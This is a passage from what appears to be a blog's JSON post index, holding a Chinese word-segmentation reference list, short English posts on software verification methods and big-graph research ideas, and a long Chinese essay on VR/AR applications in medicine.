沈阳航空航天大学, 2017. [39] 许华婷, 张玉洁, 杨晓晖,等. 基于Active Learning的中文分词领域自适应[J]. 中文信息学报, 2015, 29(5):55-62. [40] 苏晨, 张玉洁, 郭振,等. 适用于特定领域机器翻译的汉语分词方法[J]. 中文信息学报, 2013, 27(5):184-190. [41] 张梅山, 邓知龙, 车万翔,等. 统计与词典相结合的领域自适应中文分词[J]. 中文信息学报, 2012, 26(2):8-12. [42] 朱艳辉, 刘璟, 徐叶强,等. 基于条件随机场的中文领域分词研究[J]. 计算机工程与应用, 2016, 52(15):97-100. [43] 韩冬煦, 常宝宝. 中文分词模型的领域适应性方法[J]. 计算机学报, 2015, 38(2):272-281. [44] 李明. 针对特定领域的中文新词发现技术研究[D]. 南京航空航天大学, 2012. [45] 王文荣, 乔晓东, 朱礼军. 针对特定领域的新词发现和新技术发现[J]. 现代图书情报技术, 2008, 24(2):35-40. 本文链接： http://www.meng.uno/articles/e38d3f1c/ 欢迎转载！","categories":[{"name":"毕设","slug":"毕设","permalink":"http://www.meng.uno/categories/毕设/"},{"name":"研究现状","slug":"毕设/研究现状","permalink":"http://www.meng.uno/categories/毕设/研究现状/"}],"tags":[{"name":"分词","slug":"分词","permalink":"http://www.meng.uno/tags/分词/"},{"name":"跨领域","slug":"跨领域","permalink":"http://www.meng.uno/tags/跨领域/"}]},{"title":"Software Verification Approaches","slug":"software-verification","date":"2017-12-11T13:19:48.000Z","updated":"2018-02-11T14:04:49.152Z","comments":true,"path":"articles/55e262ef/","link":"","permalink":"http://www.meng.uno/articles/55e262ef/","excerpt":"Network Function Virtualization (NFV) In the beginning, we need to know NFV which through the establishment of VNF (Virtualized Network Function) to achieve some network functions on a common server, switches, memory and other hardware devices, making these network functions on a common hardware dev","text":"Network Function Virtualization (NFV) In the beginning, we need to know NFV which through the establishment of VNF (Virtualized Network Function) to achieve some network functions on a common server, switches, memory and other hardware devices, making these network functions on a common hardware device run, do not need to configure a new dedicated network elements, can greatly enhance the flexibility of the network deployment, and lower investment costs. In the process of realization of network functionality through NFV technology, VNF in the form of software running on the hardware, by way of example and to achieve termination VNF allocation and deallocation of resources. In order to avoid VNF packet forgery in transit and in storage and tampering, increasing the signature files in the software package VNF, the receiving end after receiving the VNF software package by verifying signature files for VNF package for secure authentication to ensure VNF packet during transmission security; in addition, the receiving end before VNF instantiated need for storage VNF package for secure authentication to ensure VNF package in the store security, which increased VNF instantiation delay, reduce the VNF instantiated performance. Systems-Theoretic Process Analysis (STPA) STPA is for identifying harmful circumstances which could lead to accidents and generating detailed safety requirements which must be implemented in the design to prevent the occurrence of these unsafe scenarios in the system. STPA is a top-down process and it addresses many types of hazards of components and their interactions like design errors, software flaws and component interaction failures. One of the advantages of STPA is that it can be applied at any stage of the system development process. STPA is performed by four main steps: Before conducting an STPA analysis, the safety analysts should establish fundamentals of the analysis (e.g. accidents, the associated hazards) and construct the control structure diagram. For each control action in the control diagram, the safety analysts must identify the potentially unsafe control actions of the system that could lead to a hazardous state. A unsafe control action is a control action that violates system safety constraints. Use the identified hazardous control actions to create safety requirements and constraints. Determine how each potentially hazardous control action, identified in step 2., could occur by augmenting the control structure diagram with a process model. Software Model Checking (SMC) SMC is an automatic technique based on a verification model which explore all possible software states in a brute-force manner to prove properties of their execution. The model checking process involves the target software to be formally modeled in the input language of a model checker and specifications (properties) to be formalized in a temporal logic. Many safety-critical software systems are being written in ANSI-C. Therefore, there exist a number of software model checker tools which are used to verify code conducted a comparison and evaluation of existing model checking tools for C code. This comparison showed that the SPIN model checker, a general-purpose model checker, uses an efficient algorithm to reduce the state explosion problem. Safety Analysis Combining STPA and SMC This method can derive software safety requirements at the system level and to verify them at the code level. This approach is divided into three kinds of activities: Deriving software safety requirements using STPA; Formalizing of safety requirements and Verifying software against its safety requirements at the code level. The structure is like this: Fault Tree Analysis (FTA) FTA is a top-down, deductive failure analysis in which an undesired state of a system is analyzed using Boolean logic to combine a series of lower-level events. The propose is to understand how systems can fail, to identify the best ways to reduce risk or to determine event rates of a safety accident or a particular system level failure. This method can divide into 5 steps: Define the undesired event to study; Obtain an understanding of the system; Construct the fault tree; Evaluate the fault tree; Control the hazards identified. 本文链接： http://www.meng.uno/articles/55e262ef/ 欢迎转载！","categories":[{"name":"Software Verification","slug":"Software-Verification","permalink":"http://www.meng.uno/categories/Software-Verification/"}],"tags":[{"name":"Software Verification","slug":"Software-Verification","permalink":"http://www.meng.uno/tags/Software-Verification/"}]},{"title":"Some Throughts on Big Graphs Research","slug":"big-graphs-throught","date":"2017-12-08T13:26:46.000Z","updated":"2018-02-11T14:04:49.149Z","comments":true,"path":"articles/52d6fa6b/","link":"","permalink":"http://www.meng.uno/articles/52d6fa6b/","excerpt":"Redesign the Frameworks Used for Big-Graphs Mining. Nowadays, researches on Big-graphs are only using those open source distributed systems such as Hadoop, Spark and so on. I don’t mean they are bad, but I think we could redesign some new frameworks based on they. If I do this research, I will first","text":"Redesign the Frameworks Used for Big-Graphs Mining. Nowadays, researches on Big-graphs are only using those open source distributed systems such as Hadoop, Spark and so on. I don’t mean they are bad, but I think we could redesign some new frameworks based on they. If I do this research, I will first redesign some data structure such as Inverted files for those distributed systems. Mine Frequent Subgraphs by Adding Some Parameters. Mining frequent subgraphs is very crucial to SNS network graphs. In these networks, a user is often associated with location information (e.g., positions of her hometown and check-ins). These networks are collectively known as spatial graphs. However, it isn’t mean those who are in a same location are in the same subgraph. For example, if I am in Singapore, I may also care China more Singapore, so I belong to the subgraph of China instead of others. In this circumstance, we need add more parameters to our mining methods to get the right mining result. Temporal and Streaming Systems for Dynamic Graphs Despite the plurality of graph systems, majority of them support processing static graphs only. In reality, however, many graph applications today need to handle changes to the graphs over time. Many challenges remain in this sub-field. For example, most temporal and streaming graph systems cannot efficiently handle frequent vertex and edge deletions, as deletions often break the nice properties that enable incremental computation in these systems. Certainly, maybe I will do some research in this area to support efficient analysis of dynamic graphs. Data Structure for Storing the Big-Graphs Most graph analysis systems assume that the graph is already generated in the requisite format for ingesting into the system. In practice, however, usually the graphs must first be extracted from non-graph data stores using a pre-processing step that generates the lists of nodes and edges. In many cases, graph analysis may form one component of a deep analysis pipeline, that also involves non-graph analytics operations; in such cases also, we may need to convert the data among different representations. The costs of such pre-processing or conversion steps can be significant, and in some cases, the cost of extracting graphs may dominate the actual computation that follows (e.g., if edges are generated by computing similarities between node attributes). 本文链接： http://www.meng.uno/articles/52d6fa6b/ 欢迎转载！","categories":[{"name":"Big Graphs","slug":"Big-Graphs","permalink":"http://www.meng.uno/categories/Big-Graphs/"}],"tags":[{"name":"Big Graphs","slug":"Big-Graphs","permalink":"http://www.meng.uno/tags/Big-Graphs/"}]},{"title":"浅析VR/AR+：医疗","slug":"vr-ar-medicine","date":"2017-11-18T13:07:15.000Z","updated":"2018-02-14T11:13:32.514Z","comments":true,"path":"articles/c1dd0093/","link":"","permalink":"http://www.meng.uno/articles/c1dd0093/","excerpt":"VR/AR介绍 虚拟现实技术（VR）是一种可以创建和体验虚拟世界的计算机仿真系统，它利用计算机生成一种模拟环境，是一种多源信息融合的、交互式的三维动态视景和实体行为的系统仿真使用户沉浸到该环境中。 VR是仿真技术的一个重要方向，是仿真技术与计算机图形学人机接口技术多媒体技术传感技术网络技术等多种技术的集合，是一门富有挑战性的交叉技术前沿学科和研究领域。VR主要包括模拟环境、感知、自然技能和传感设备等方面。模拟环境是由计算机生成的、实时动态的三维立体逼真图像。感知是指理想的VR应该具有一切人所具有的感知。除计算机图形技术所生成的视觉感知外，还有听觉、触觉、力觉、运动等感知，甚至还包括嗅觉和味觉","text":"VR/AR介绍 虚拟现实技术（VR）是一种可以创建和体验虚拟世界的计算机仿真系统，它利用计算机生成一种模拟环境，是一种多源信息融合的、交互式的三维动态视景和实体行为的系统仿真使用户沉浸到该环境中。 VR是仿真技术的一个重要方向，是仿真技术与计算机图形学人机接口技术多媒体技术传感技术网络技术等多种技术的集合，是一门富有挑战性的交叉技术前沿学科和研究领域。VR主要包括模拟环境、感知、自然技能和传感设备等方面。模拟环境是由计算机生成的、实时动态的三维立体逼真图像。感知是指理想的VR应该具有一切人所具有的感知。除计算机图形技术所生成的视觉感知外，还有听觉、触觉、力觉、运动等感知，甚至还包括嗅觉和味觉等，也称为多感知。自然技能是指人的头部转动，眼睛、手势、或其他人体行为动作，由计算机来处理与参与者的动作相适应的数据，并对用户的输入作出实时响应，并分别反馈到用户的五官。传感设备是指三维交互设备。 而增强现实技术（AR）是一种实时地计算摄影机影像的位置及角度并加上相应图像、视频、3D模型的技术，这种技术的目标是在屏幕上把虚拟世界套在现实世界并进行互动。AR最早是于1990年提出的，之后随着电子产品运算能力的提升，其应用也是用途愈广。尤其是近两年来AR技术可谓是备受关注！现在的市场中由于可穿戴设备的出现，以及手机性能的进一步提升，AR技术也是持续升温。 AR是一种将真实世界信息和虚拟世界信息“无缝”集成的新技术，是把原本在现实世界的一定时间空间范围内很难体验到的实体信息（视觉信息,声音,味道,触觉等），通过电脑等科学技术，模拟仿真后再叠加，将虚拟的信息应用到真实世界，被人类感官所感知，从而达到超越现实的感官体验。真实的环境和虚拟的物体实时地叠加到了同一个画面或空间同时存在。不仅展现了真实世界的信息,而且将虚拟的信息同时显示出来，两种信息相互补充、叠加。在视觉化的AR实现中，用户利用头盔显示器，把真实世界与电脑图形多重合成在一起，便可以看到真实的世界围绕着它。 在接下来的叙述中，我将在第二部分分析VR/AR对于医生角度的应用，第三部分分析在病人角度的应用，第四部分是在医疗教育方面的应用，其他相关的研究我将在第五部分陈述，现阶段研究的不足将在第六部分分析，最后两部分是一点我的个人感想和本文结论。 对于医生的应用 模拟手术 虚拟手术作为一个虚拟现实领域的重要研究方向，正成为科学家们的关注焦点。它是集现代医学、计算机图形学、计算机视觉、生物力学、材料学、机器人等诸多学科为一体的新型交叉研究领域。医生可以通过虚拟现实技术来模拟、指导医学手术所涉及的各种过程，包括手术计划制定、手术排练演习、手术教学、手术技能训练、术中引导手术、术后康复等。 80%的手术失误是人为因素引起的，因此手术训练极其重要。以前医生手术训练都只能在病人身上做，所以经常说有名的医生都是踏过多少人的血液才走过来的，这样付出的代价实在太大。在VR/AR技术飞速发展并广泛应用的今天，模拟手术在医生训练过程中非常重要的应用就是，医生可以在不接触实际病人的前提下模拟各种手术场景，模拟的场景可能比真实遇到的情况还要多，这样模拟训练的效果实际上就超过了真实的练刀。一方面，模拟训练可以在任何地方、任何时间反复模拟，深化印象，这个优点在实际病人身上是不可能也不允许做的，因为病人的资源是有限的。模拟手术就是把每个可能的手术场景都呈现在你的面前，每个人得到的机会都是无穷次的，医生可以反复看、反复练，并且对病人没有伤害。如果从这点来讲，一个经过模拟训练的医生再给病人做手术时，他的学习周期就会很短很短，这个实际上是对病人利益的极大保护。当前模拟手术在中国也已经有了，像强生公司、科汇公司的外科培训中心已经有腹腔镜的模拟，也有介入手术的模拟，当然还有达芬奇手术的模拟，但这种模拟还不是真实场景的，也就是说未来在VR技术里面，可以完全进入到手术室，然后在真实的场景里面进行模拟手术，那就更加接近于现实。 大家应该知道在体育运动里，比如足球、体操，都有慢动作回放，有动作捕捉去分析运动员动作是否做到位了，失误的原因是什么。这个技术同样可以用到外科手术里。通过运动捕捉或者手势识别和VR技术，在外科大夫进行学习或尝试以后，可以复原手术，看到手术的过程，如果有失误，原因是什么。这种回放能极大的帮助医生改进他们的技术。 远程干预/指导 世界上首例实验性远程手术已经在1999年成功地进行。虚拟手术与远程干预将能够使在手术室中的外科医生能实时地获得远程专家的交互式会诊。交互工具可以使顾问医生把靶点投影于患者身上来帮助指导主刀外科医生的操作，甚或通过遥控帮助操纵仪器。这能使专家们技能的发挥不受空间距离的限制。如果VR技术在这一方面继续发展的话，可能会出现以后医生不用到医院上班，无论在任何地方都可以实施手术。缓解了当今医院基础设施不足的现状。同时，有些相同的手术，某专家可以通过VR技术远程指导，这样就打破了一个时间段只能进行一项手术的限制，大大提高医疗的效率。 精确操作 如上文已经提到的达芬奇机器人，还有很多像这种医生能够远程控制其操作的手术设备，通过使用这些设备，能够在实际的手术中，避免因为医生长时间工作造成的身体情况变化而带来的手术质量参差不起的问题（例如某医生一天手术过多，太过劳累，这样后来的手术必然会质量下降）。如果使用了VR技术，远程控制诸如达芬奇机器人一样的手术设备，不管医生自己身体状况如何，只要控制到位，那些手术设备是不会因为工作时间长就产生不适的，这样也能保证手术质量优秀。同时，一个医生只有两只手，所以有些手术需要助手，而使用那些设备之后，一个医生可以控制很多只手，这样就能够协调统一，对手术质量有百利而无一害。 协助执行日常任务 医生需要经常查看病人的病情，而在现在的医疗设施情况下，对于一个医生，可能得通过“查房”一间一间地去病房里与病人交流，而且交流记录难免会记忆不清或者甚至搞混了。有了VR技术虚拟医生协助真实医生实现这些复杂的工作，效率必然会大大提高。医生甚至都不用出办公室，只需要观察相应的VR反馈就可以基本实现之前的“查房”任务。这样一来就可以大大减轻医生的负担，必然会对医生的日常工作效率产生积极的影响。这些虚拟医生与病人交流的数据可以保存用来对之后的反馈对比，当然可以用其他机器学习的方法来进行一些预测之类的计算。并且基于大数据，可能这些虚拟医生对单个病人情况的分析会比真实的医生更专业，因为医生也不是能对每个症状都了如指掌的。 有些病人（例如老人和小孩等）可能在认识自己病情上有欠缺，例如忘记吃药，每次吃多少药等，在传统的方案中，要么有专人提醒，要么在显眼的地方做上标记提醒，总之效率不高或者费时费人力。当我们在某种小的设备上加上VR/AR提醒，以一个三维立体的形象的形式来提醒病人，既省时又省人力，效率相对还比较高。 获得医药信息 医生可能不能记住每种药物的作用，以及每种药物的使用方式，假如能通过VR技术将每种药的使用信息都记录下来，通过相关的设备，让医生在给病人开药的时候头脑里能对这种药的所有情况都回顾一遍，同时还可以与几种相似的药做对比，找出最好的组合，避免偶尔的误用药。 获取用户机体信息 在现在正常的医学治疗步骤中，医生想要检查病人某部位的病变情况，只能使用诸如CT、CTA等基于切片的二维人体部位图像，这种图像相对来讲专业要求度较高，对人体伤害较大，同时准确性也不能得到保障。将VR应用于此种工作，我们可以得到人体某部位的三维立体真实大小的模型，这样一来医生的判断会更加准确而且这种图识别起来相对不需要那么复杂的专业知识。 血管照明（辅助手术） 这算是一种比较专业地说法，和辅助手术概念比较类似，简而言之就是通过PC应用软件帮助医务人员在手术中能够查看隐藏的血管。此前，心脏病专家借助谷歌眼镜疏通了一位49岁男患者阻塞的右冠状动脉。冠状动脉成像（CTA）和三维数据呈现在智能眼镜的显示器上，根据这些实时放大图像，医生可以方便地将血液导流到动脉。不同于传统手术，AR的介入就像一个”AR放大镜”，直接放大手术创口，患者的彩超、MRI、CT图像等将直接映在手术部位，让医生能够看到肉眼难以分辨的细微情况，获得“透视”功能，大大提高手术操作的效率和舒适度。 损伤评估 在传统的医疗实践中，如果病人就诊，医生为了确定病人病情只能通过明显的外表特征或者患者的口头表述来确定，而这样的手法往往会带来误判或者病情程度判断不清等问题，特别是那种很难表述清楚的内科疾病。运用虚拟现实技术，我们可以针对不同的疾病设定不同的诊断场景，让用户在特定场景中将应该表现出来的病症全部表现出来，这样一来有利于增大诊断的准确性。 对于病人的应用 智能康复系统 基于Kinnect等运动捕捉设备所设计出的很多结合VR/AR技术的智能康复系统，这些系统能够很好的帮助病人进行相应的康复训练。在之前我所看到的一个例子中， 病人只需要带上相应的可穿戴传感器就可以将自己的动作传到相应的计算机进而在计算机显示屏上显示用户的动作以及在显示屏中出现的影像之间的交互。在我所看到的实例中，他们只是能做到在场景中增加一些物体（例如长方体等），让病人在虚拟的环境中模拟各种体力锻炼。这样一来，我们就不需要实际花费很多的金钱来布置训练场景，而且VR所形成的场景还可以很轻易得更换，不用为维护实际的场景而花费很多精力。 调查显示，以色列的研究人员开发出一套“电脑辅助康复环境系统”，通过模拟划船、打球、慢跑等各种情景，来帮助残障人士改善平衡能力，恢复身体的运动机能。足部神经受损的博罗夫斯基就在接受“电脑辅助康复环境系统”的治疗。现在系统模拟的是“海上冲浪”，大屏幕上显示的是冲浪的场景，博罗夫斯基脚下的踏板会根据设置好的程序相应的摇动，他必须通过调节身体的姿势来保持平衡。同时，连接在他身上的传感器还能把各种身体体征数据传回电脑，以便医生调整训练强度和难度。丰富的影像和新颖的训练方式，让患者像在做游戏一样，更能提高患者本身的主动性和积极性，加强训练效果，缩短住院时间，加快康复过程。无论从时间、人力还是金钱上讲，VR/AR技术的使用必然会在康复系统上带来一场新的革命。 帮助治疗某些疾病 有些疾病（例如某种危险情况恐惧症），需要病人在再临其境时才可能克服，但如果让患者在现实中的危险环境再次体验，可能会有安全性问题，而且相同的场景很难真实地完美还原。如果使用VR技术，就可以在基本不耗费后期资源的情况下反复体验相同的场景，在现实中，用户也不会有任何的伤害，而且可调节范围比较广，毕竟是电脑虚拟程序，恐怖程度、危险指数等都可以随心所欲地变化，与现实相比真的是有巨大的优势。 截肢者中最常见的烦恼就是幻肢痛——患者感到被切断的肢体仍在，且在该处发生疼痛。疼痛多在断肢的远端出现，疼痛性质有多种，如电击、切割、撕裂或烧伤等。对幻肢痛的发生原理，目前尚无统一意见，西医亦乏有效疗法。很有可能大脑对肢体仍然存有意识，即使它已经不存在了。尽管这样的问题发生存在一定的频率，但至今没有一种有效地方法适用于所有的截肢者。在使用VR技术治疗过程中研究人员使用头戴式耳机和一个传感器将患者带入虚拟的世界，患者可以感受到自己的肢体还在，并可以控制虚拟肢体从事某项工作或游戏。这样就能很好的解决这一疾病，有研究表明对这种疾病VR治疗作用十分显著。 VR对创伤后应激障碍也同样有很好的治疗作用。在对从伊拉克和阿富汗返回患有创伤后应激障碍的士兵所进行的VR治疗过程中，VR设备会将会把士兵带回中东的一个小镇，让他们再次“经历”战争和死亡，使其在适当的压力下逐渐学会处理，控制自己的情绪。虽然很多人对于这种治疗方式存在争议，支持者说使用虚拟现实技术与其他的治疗方式相结合会达到非常很理想的治疗效果。 VR可以帮助治疗的心理障碍并不仅仅局限于创伤后应激障碍。还有些心理问题（例如自闭症、害羞等），是一个杀人于无形的凶手，目前呈现向低龄化蔓延的趋势。虚拟现实可能也会成为这个问题的解决方案之一。如果有人能既为患者保守秘密有能很好的与用户交流，对治疗这些疾病肯定是有很大的好处的，但是现实中不可能存在这样的一个完美的“倾听者”，即使有，价钱也是不菲的。如果VR/AR能够起到这样的作用那必然会是又一大医学进展。 很多心理治疗师和精神专家常用的方式是通过在治疗过程中去引导患者回忆或者想象场景，以此来达到治疗的目的。VR的好处在于它能够让这种环境场景变得可视化和标准化。因此在心理治疗领域，比如说创伤应急、障碍症、恐惧症、自闭症、恐高症、幽闭症、公开演讲恐惧症、密集恐惧症等都可以通过VR技术的环境再现以达到治疗的目的。再比如说，焦虑症、注意力缺陷以及精神分裂症也可以通过VR来虚拟特定的人或是特效来改善相关的一些症状。 虚拟问诊 在国内外，好的医生都是十分欠缺的，然而相同的疾病缺屡见不鲜，可以说很多小病完全可以在还是在早期的时候就通过及时就诊可以避免出现的，在之前的这么多年，很多搜索引擎也都在做相关的疾病问答系统，可悲的是大多受金钱诱惑，为金钱奴役，不干正事反而虚假宣传。VR技术的出现，必然在医疗问答方面带来很大的革新，患者可以通过VR设备与虚拟的医生直接进行交谈，不仅避免了文字表述不清的问题，而且也避免受网页上那么多的虚假广告的诱惑，更是给人一种如见真实医生的舒适的感觉，而且VR医生会比现实中医生更有耐心，更专职为你一人服务。 缓解疼痛 读到这样一个故事，“2017年年初，美国的一位脂肪瘤患者开刀时，因为平时血压过高，医生只为她注射了少量镇静剂。医生为她戴上了VR设备，在手术过程中患者一直在玩一个埃及探险的游戏。手术过程中，监测仪器显示患者的一切生命体征参数，都非常平稳。在整个手术过程中，患者的血压不仅没有提升，反而下降了。手术完成后，患者表示她几乎没有感到疼痛。”我觉得有了这个实例，我不需要过多的解释，已经能够很好的说明VR在缓解病人疼痛上的作用了吧。无独有偶，接受重度烧伤治疗是一段痛苦的经历。伤口清理和绷带变化都会引发疼痛，即便使用吗啡等麻醉药物，仍有86%的病人会感到或多或少的疼痛，并且大量使用还会对身体造成一定伤害。1996年，华盛顿大学人机界面技术实验室（HITLab）研究人员发现孩子们在玩游戏时是越来越全神贯注后，想出了为治疗烧伤提供VR游戏，假设沉浸在游戏中会为病人带来积极疗效，他们会更专注于游戏，而减轻对疼痛的注意力。据调查，社会行为医学2011年发布的调查展示了浸入式游戏作为止痛剂的强大作用。并且现在这项技术已经被美国军方使用，帮助受伤的士兵接受治疗。 当然在平时的生活中，VR也是能够起到很好的。当我们沉浸在一个虚拟的美好的游戏环境中时，我们可以忘记暂时的伤痛，这是一个常识，也是VR能在这一方面得到巨大应用的一个原因。 戒瘾 当今社会的另一大“疾病”，不是身体上的，更大多数是心理上的，例如网瘾、烟瘾甚至毒瘾。在以前的戒瘾所，采取的唯一方式就是物理上的隔离，在VR技术快速发展的今天，我们完全可以通过VR将患者的精力集中到正确的角度上，不仅可以将效果提高，而且省时省力。查阅资料发现，我国相关法律已经开始涉足使用VR进行戒毒活动了。 当然，其实在这里VR可能成为一把双刃剑，可能能将用户的注意力从其他那些及其不正常的生活习惯中解救出来，但是可能又会让用户陷入“VR瘾”中，现在我们还无法证明这个“VR瘾”和其他的“网瘾”、“烟瘾”等孰轻孰重，所以此法需要慎重使用。 VR/AR与视觉结合 VR本身就是可以直接作用于人的视觉，视觉治疗方案与VR技术很容易匹配。现在升学、工作压力，导致大部分人都有眼部疾病或视觉障碍。VR在治疗眼部的疾病，比如儿童的斜视、近视以及立体视力的缺陷上有很好的效果。虽然在不久之前就有对近视等疾病的物理治疗方案，但是大多费时费力，而且没有听说有什么可观的进展。但是VR/AR的到来就完全不同了，大大提高了效率而且效果明显提高。同时可以制作一种VR设备用来缓解疲劳的眼球，当我们工作或者学习很长时间之后，可以用它来对眼球“做做操”。虽然我们都明白久看之后需要远眺一会，或者看看绿色的动西，但是迫于现实，我们可能很难做到（例如哈尔滨的冬天没有绿树。），但是这一切都可以用VR设备来实现。 缓解术前压力 接受手术的患者到了陌生环境，难免会有应激反应。他们可能觉得在手术室外等候，麻药还没有生效的时候，他们有强烈的紧张感和恐惧感，甚至有了濒临死亡的体验。现在想一想，这种体验对每个人来说都是非常不好的。虽然术前医生和患者有充足时间做沟通，但是单纯靠用嘴讲、用图、甚至手画示意图，都是一件非常累的事情，因为手术的复杂性和专业性，包括一些专有名词，对患者来说真的是选择性记忆，他们有可能听了上半句，就忘了下半句，甚至把最主要的东西漏掉，支离破碎地理会医生的意思，即使再出色的现场描述也比不过真实环境的真实还原。如果运用VR技术，在手术开始前给患者放一段容易让他放松的内容，让他在进手术室之前，大致了解手术室和手术过程是什么样子的，就能消除他对未知环境的恐惧。我相信这对患者来说是人文的关怀，这在提高医学服务水平里面可以得到有效的应用。 隐私保护 现在我国的搜索引擎在医疗上很不受人看好的一个主要原因就是其泄露用户隐私的现象太严重，所以很少有人真正愿意相信搜出来的东西。加入VR/AR元素进入我们的生活，我们可以与虚拟形象进行完全不用担心泄露隐私的情况下的交流。 医疗教育的应用 手术教学 伴随互联网的继续发展，如果医学手术教育能够通过VR/AR技术实现，至少在解剖学课程上可以实现意想不到的效果。在相关的设计中，例如心脏的VR模型可以做的特别逼真，让学生可以把心脏托在手里面，随时都可以转圈、打开肌肉看，血流都可以看，这就可以大大缩短医学生的学习周期（而且可以打破时间、地点的限制来学习）。尤其对于外科医生来讲，外科医生很重要的工作就是解剖。局部解剖以前医学生只能通过书本来学习，看到的都是平面的东西，脑子里很少有立体的概念，无法产生互动，进而需要很长的时间来消化知识，甚至很多时候大多数医学生并不能形成很好的立体的模型在脑子中，所以这就是很多庸医出现的根源。VR/AR技术的出现使得医学生在真正操刀做手术之前，就能获得局部解剖的经验，能够有效提高手术的安全性和成功率。而如果医学生通过VR/AR技术实现解剖模拟，学习速度会大大加快，同时降低学习的成本。当然AR在医学教育的应用并不仅仅是在解剖学上面，在生理生化方面都是可以通过VR技术模拟场景的。如果我们可以获得很形象的信息的话，对医生的知识拓展和学习速度都会急剧加快。 据早在1993年的统计里，全球市场上出现的805个虚拟现实应用系统中就有49个应用于医学，主要应用在虚拟人体、医学图像学、药物分子研究等方面。大家都知道，在传统的医学教育中，如人体标本解剖和各种手术实训，大都受到标本、场地等限制，实训费用高昂。而且医学生不能通过反复在病人身上进行操作来提高临床实践能力、临床实践具有较大风险。而VR的直观和体验特性却可以很好地解决以上问题。目前在医学教育上应用较多的有虚拟人体解剖学、手术训练教学、虚拟实验室、虚拟医院等。类别也从内容、软件到硬件，甚至还有从事交叉研发的，比如，Oculus涉足了内容、硬件和软件等方面，微软HoloLens则是软硬件结合等。 利用VR技术来做外科手术培训另一个重要的特点是，大大节约了成本。在外科领域，医疗知识每隔6~8年就要翻一番，所以外科大夫在专业教育上尤其是在继续教育上需要不断追求对新技术的学习，这种新技术的学习成本是高昂的，方法是复杂的。而VR技术可以在某种程度上帮助大家学习或者熟悉这种新技术。 教学用具改革 传统解剖学挂图和大部分多媒体课件上应用的教学图片都是二维模式，缺少直观的、立体的体验，造成了解剖学习的困难。模型、标本虽具有立体结构，但形式单一、僵硬，不能满足多角度、多层次的教学和实训需求。而虚拟人体解剖图，可在显示人体组织器官解剖结构的同时，显示其断面解剖结构，并可以任意旋转，提供器官或结构在人体空间中的准确定位、三维测量数据和立体图像。此前，美国加州健康科学西部大学（波莫纳）开设了一个虚拟现实学习中心，该中心拥有四种VR技术、zSpace显示屏、Anatomage虚拟解剖台、Oculus Rift和iPad上的斯坦福大学解剖模型，旨在帮助学生利用VR学习牙科、骨科、兽医、物理治疗和护理等知识。 相关研究进展 尽管业内不少人将2016/2017年称之为“VR发展元年”，若追溯VR发展的历史，早在1932年，Aldous Huxley在其推出的科幻小说《美丽新世界》中即对虚拟现实概念进行了描述。而直到1968年计算机科学家Ivan Sutherland开发了“达摩克利斯之剑”，使得VR设备具备了基本的雏形。随后，VR设备开始应用在一些专精领域，如宇航员的训练活动中。直到1987年，任天堂推出了Famicom3D System眼镜之后，Virtual Boy等设备将VR概念正式带入民用领域。而随着近些年来，视频技术以及移动硬件领域的不断发展，民用VR平台也根据使用者的不同呈现出了分化的状态，包括以游戏平台作为计算平台的专属VR平台、以PC作为计算平台的综合体感VR平台、以及以移动设备作为计算与显示窗口的VR眼镜。 硬件厂商方面，在对各类VR设备的研发加大投入力度，VR头盔，眼镜，以及附属的传感器设备在过去的一年中纷纷涌现。 视频平台方面，除了传统视频上传方式外，各大视频平台均开放了“全景视频”的上传接口，用于鼓励视频制作团队为平台增加全景类视频的内容量。但由于目前全景视频的制作与存储成本非常高，能够完成全景视频录制与制作的团队并不多，所以目前多数存留在VR平台端的视频实际为3D的“沉浸式”的视频内容。除此之外，部分平台采取聚合方式，将目前市面上鲜见的VR视频内容加以收集整理，集中呈现在用户面前。而技术方案提供方虽然距离用户较远，却是目前推进整个VR行业发展的最为重要的一方，技术方案将成型的算法，图像引擎等输出给视频平台或硬件厂商，以增强用户在两方的使用体感。 存在的问题 VR在医疗应用方面，相比用作练习、模拟来讲还是很欠缺的。AR in China 最近期的统计，如今国内从事AR应用开发的企业有200多家，其中80%倾向和已开发游戏类应用，剩余的也多偏向影视、购物等生活类应用。而专注在医健领域的应用，根据公开信息推测目前不超过10家。而在海外，据 CBInsights、CrunchBase、AngelList 网站的综合数据查询，目前有30家左右初创公司正专注在AR医疗应用领域。其中9家初创公司获得融资，总融资额达5.52亿美元，获投率达到了30%。AR在医健领域的应用还处于蓝海探索期。 纯粹的VR在医疗领域还是有很大欠缺的。在现在的VR辅助手术中，医生只能利用AR技术的一些优势，并不能完全交给VR来做，还需要加上传统方法，一边做手术一边对着电脑屏幕比对着看。 VR用于治疗方式的缺点是患者的想象和回忆难于把控，所以效果很难评估。 而且现在的VR在显示和精确度方面还是有很大的提升空间的。特别实在医疗领域，准确度至关重要。 对于医生而言，还有适应问题，这些新技术对于有经验的外科医生及其他专业医护人员来讲，“适应”是最大的挑战。 虽然VR技术在医学上应用后能够减少现实中的直接的隐私泄露，但是如果VR数据泄露将导致比现在信息泄露更严重的后果，毕竟VR可以记录整个人的信息而不仅仅是文字信息。 VR的一个很大的问题就是基础硬件设备的体验问题。如果要让医生或者被治疗者长时间呆在虚拟环境中，很容易产生一些生理不适的症状。 虽然说VR在医学上的应用很丰富，尤其是在心理治疗方面颇有成效。但是考虑到治疗的针对性和VR内容制作难度等各种问题，这种辅助治疗方法在现阶段很难进行大规模的应用。 医疗行业需要的是严谨的专业知识和态度，所以对于内容的要求也就相应的提高。如果要开发出一套模拟的人体用来交互培训，需要的是具备医学加上合理内容开发的复合型人才。而且考虑到医学诊断的高精度要求，许多器官或者组织的建模都要非常精细，不能有一丝的马虎，而现在的VR医疗应用更多的还是停留在头戴式VR视频方面。 其他要面临的困难还有：治疗和评估标准没有相关的评估标准、应用系统的交互性和易用性还不够完美。虚拟现实系统设备及其外设性价比例失衡，设备相对比较昂贵,致使大规模应用的时机还不够成熟。 个人感想 虽然最近VR/AR技术越来越火，相关研究也相当多，涉及的行业也是相当全面，但是在现在的情况下，绝大多数成就集中在仿真、游戏上，在医疗领域还是存在很多问题，还有很长的路要走。但希望不要又只能火两年而已。 在医疗工作的各个领域推广VR技术的应用，可以节省大量的时间与资源，从而更快捷、更安全的挽救生命。国际上由于虚拟现实技术的发展而发展起来的医疗电子设备正以每年10%的速度增长。随着计算机、多媒体技术、传感技术、通讯技术的发展以及各国对虚拟现实技术的日益重视，相信这一技术在医学上的应用在将来会取得更大的发展，它的发展前景非常诱人。可以预言，虚拟现实技术在医学中更广泛、更深入的应用将会给传统医疗带来革命性的变化。 